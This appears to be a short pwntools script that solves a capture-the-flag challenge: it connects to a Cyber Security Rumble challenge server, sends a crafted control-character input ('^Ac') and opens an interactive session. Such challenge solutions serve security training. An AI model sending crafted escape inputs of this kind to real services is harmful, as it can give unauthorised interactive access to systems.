from pwn import *
io = remote("chal.cybersecurityrumble.de",9124)
io.send("^Ac")
io.interactive()
